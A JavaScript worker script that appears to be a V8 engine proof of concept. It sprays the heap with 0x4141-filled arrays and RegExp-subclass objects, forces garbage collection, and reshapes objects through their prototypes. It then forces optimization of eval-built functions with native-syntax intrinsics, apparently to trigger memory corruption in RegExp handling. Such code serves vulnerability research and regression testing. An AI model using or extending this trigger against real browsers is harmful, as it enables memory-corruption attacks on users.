onmessage = function(msg) {
   go();
}

class largeObj{
   constructor(){
       this.a0 = 1
       this.a1 = 1
       this.a2 = 1
       this.a3 = 1
       this.a4 = 1
       this.a5 = 1
       this.a6 = 1
       this.a7 = 1
       this.a8 = 1
       this.a9 = 1
       this.a10 = 1
       this.a11 = 1
       this.a12 = 1
       this.a13 = 1
       this.a14 = 1
       this.a15 = 1
       this.a16 = 1
       this.a17 = 1
       this.a18 = 1
       this.a19 = 1
       this.a20 = 1
       this.a21 = 1
       this.a22 = 1
       this.a23 = 1
       this.a24 = 1
       this.a25 = 1
       this.a26 = 1
       this.a27 = 1
       this.a28 = 1
       this.a29 = 1
       this.a30 = 1
       this.a31 = 1
       this.a32 = 1
       this.a33 = 1
       this.a34 = 1
       this.a35 = 1
       this.a36 = 1
       this.a37 = 1
       this.a38 = 1
       this.a39 = 1
       this.a40 = 1
       this.a41 = 1
       this.a42 = 1
       this.a43 = 1
       this.a44 = 1
       this.a45 = 1
       this.a46 = 1
       this.a47 = 1
       this.a48 = 1
       this.a49 = 1
       this.a50 = 1
       this.a51 = 1
       this.a52 = 1
       this.a53 = 1
       this.a54 = 1
       this.a55 = 1
       this.a56 = 1
       this.a57 = 1
       this.a58 = 1
       this.a59 = 1
       this.a60 = 1
       this.a61 = 1
       this.a62 = 1
       this.a63 = 1
       this.a64 = 1
       this.a65 = 1
       this.a66 = 1
       this.a67 = 1
       this.a68 = 1
       this.a69 = 1
       this.a70 = 1
       this.a71 = 1
       this.a72 = 1
       this.a73 = 1
       this.a74 = 1
       this.a75 = 1
       this.a76 = 1
       this.a77 = 1
       this.a78 = 1
       this.a79 = 1
       this.a80 = 1
       this.a81 = 1
       this.a82 = 1
       this.a83 = 1
       this.a84 = 1
       this.a85 = 1
       this.a86 = 1
       this.a87 = 1
       this.a88 = 1
       this.a89 = 1
       this.a90 = 1
       this.a91 = 1
       this.a92 = 1
       this.a93 = 1
       this.a94 = 1
       this.a95 = 1
       this.a96 = 1
       this.a97 = 1
       this.a98 = 1
       this.a99 = 1
       this.a100 = 1
       this.a101 = 1
       this.a102 = 1
       this.a103 = 1
       this.a104 = 1
       this.a105 = 1
       this.a106 = 1
       this.a107 = 1
       this.a108 = 1
       this.a109 = 1
       this.a110 = 1
       this.a111 = 1
       this.a112 = 1
       this.a113 = 1
       this.a114 = 1
       this.a115 = 1
       this.a116 = 1
       this.a117 = 1
       this.a118 = 1
       this.a119 = 1
       this.a120 = 1
       this.a121 = 1
       this.a122 = 1
       this.a123 = 1
       this.a124 = 1
       this.a125 = 1
       this.a126 = 1
       this.a127 = 1
       this.a128 = 1
       this.a129 = 1
       this.a130 = 1
       this.a131 = 1
       this.a132 = 1
       this.a133 = 1
       this.a134 = 1
       this.a135 = 1
       this.a136 = 1
       this.a137 = 1
       this.a138 = 1
       this.a139 = 1
       this.a140 = 1
       this.a141 = 1
       this.a142 = 1
       this.a143 = 1
       this.a144 = 1
       this.a145 = 1
       this.a146 = 1
       this.a147 = 1
       this.a148 = 1
       this.a149 = 1
       this.a150 = 1
       this.a151 = 1
       this.a152 = 1
       this.a153 = 1
       this.a154 = 1
       this.a155 = 1
       this.a156 = 1
       this.a157 = 1
       this.a158 = 1
       this.a159 = 1
       this.a160 = 1
       this.a161 = 1
       this.a162 = 1
       this.a163 = 1
       this.a164 = 1
       this.a165 = 1
       this.a166 = 1
       this.a167 = 1
       this.a168 = 1
       this.a169 = 1
       this.a170 = 1
       this.a171 = 1
       this.a172 = 1
       this.a173 = 1
       this.a174 = 1
       this.a175 = 1
       this.a176 = 1
       this.a177 = 1
       this.a178 = 1
       this.a179 = 1
       this.a180 = 1
       this.a181 = 1
       this.a182 = 1
       this.a183 = 1
       this.a184 = 1
       this.a185 = 1
       this.a186 = 1
       this.a187 = 1
       this.a188 = 1
       this.a189 = 1
       this.a190 = 1
       this.a191 = 1
       this.a192 = 1
       this.a193 = 1
       this.a194 = 1
       this.a195 = 1
       this.a196 = 1
       this.a197 = 1
       this.a198 = 1
       this.a199 = 1
   }
}


class MyCls extends RegExp{
   constructor(...args){
       super(...args);
       this.a = 1;
       this.b = 2;
   }
}

function go(){

   var a = "a";
   var g = "g";
   var obj = {};
   var obj2 = {};
   var arr_keeper = [];
   var keeper = [];

   function to_fast(reg){
      delete reg.a;
      obj.__proto__ = reg;
      obj[0] = 1;
      obj.__proto__ = obj2;
      delete obj[0];
      return reg;
   }

   for(var i = 0; i < 259; i++){
      var tmp = new Array(0x1000 - 8);
      tmp.fill(0x4141);
      arr_keeper.push(tmp);
   }

   gc(true);
   gc(true);

   for(var i = 0; i < 620; i++){
      if(i == 10){
         for(j = 0; j < 20; j++){
            keeper.push(new largeObj());
         }
      }
      keeper.push(new MyCls(a, g));
   }

   gc(true);

   for(var i = 0; i < keeper.length; i++){
      if(keeper[i] instanceof RegExp){
         to_fast(keeper[i]);
      }
   }

   gc(false);
   var str = "aaaazzzz";
   for(var i = 0; i < keeper.length; i++){
      if(keeper[i] instanceof RegExp){
         eval(`function test_${i}(input, value){return input.test(value);}`);
         eval(`%PrepareFunctionForOptimization(test_${i});`)
         eval(`test_${i}(keeper[${i}], str)`);
         keeper[i].lastIndex = 0;
         eval(`%OptimizeFunctionOnNextCall(test_${i});`);
         eval(`test_${i}(keeper[${i}], str)`);
      }
   }
   postMessage("done");
}